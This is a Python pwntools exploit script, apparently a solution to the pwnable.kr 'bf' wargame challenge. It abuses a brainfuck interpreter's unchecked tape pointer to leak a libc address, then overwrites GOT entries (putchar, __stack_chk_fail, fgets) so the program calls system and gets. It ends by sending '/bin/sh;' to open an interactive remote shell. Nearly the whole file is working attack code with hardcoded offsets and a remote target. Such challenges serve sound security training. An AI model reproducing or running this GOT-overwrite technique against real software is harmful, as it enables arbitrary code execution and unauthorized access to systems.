#/usr/bin/python
from pwn import *

#context.log_level='debug'
r = process('./bf', env={'LD_PRELOAD':'./bf_libc.so'})
r = remote('pwnable.kr', 9001)
#gdb.attach(r, 'b* 0x0804875b')
r.recvuntil('[ ]\n')

'''
.got.plt:0804A010 off_804A010     dd offset fgets 
.got.plt:0804A014 off_804A014     dd offset __stack_chk_fail
.got.plt:0804A030 off_804A030     dd offset putchar  
.bss:0804A040 stdin@@GLIBC_2_0
.bss:0804A080 p  
.bss:0804A0A0 tape  

main 08048671
'''

payload = ''
## libc leak ##
payload += '<'*(0x0804A0A0-0x0804A040-3)
payload += '.'
payload += '<'
payload += '.'
payload += '<'
payload += '.'
payload += '<'
payload += '.'
## putchar overwrite to return main ##
payload += '<'*(0x10-3)
payload += ',' # 0x71
payload += '<'
payload += ',' # 0x86
payload += '<'
payload += ',' # 0x04
payload += '<'
payload += ',' # 0x08
payload += '.'

r.sendline(payload)

libc = 0
for i in range(4):
	libc += (ord(r.recv(1)) & 0xff) << (0x8*(3-i))

success('leak = '+hex(libc))
libc -= 0x1b25a0
log.info('libc_base = '+hex(libc))
system = libc + 0x3ada0
log.info('system = '+hex(system))
gets = libc + 0x5f3e0
log.info('gets = '+hex(gets))

r.send(chr(0x08))
r.send(chr(0x04))
r.send(chr(0x86))
r.send(chr(0x71))

r.recvuntil('[ ]\n')

payload = ''
payload += '<'*(0x0804A0A0-0x0804A014-3)
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
## fgets -> gets
payload += '<'
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','

payload += '.'

r.sendline(payload)

r.send(chr( (system >> 0x8*3) & 0xff ))
r.send(chr( (system >> 0x8*2) & 0xff ))
r.send(chr( (system >> 0x8*1) & 0xff ))
r.send(chr( (system >> 0x8*0) & 0xff ))

r.send(chr( (gets >> 0x8*3) & 0xff ))
r.send(chr( (gets >> 0x8*2) & 0xff ))
r.send(chr( (gets >> 0x8*1) & 0xff ))
r.send(chr( (gets >> 0x8*0) & 0xff ))

r.recvuntil('[ ]\n')

payload = '/bin/sh;'
payload += 'z'*0x400

r.sendline(payload)

r.interactive()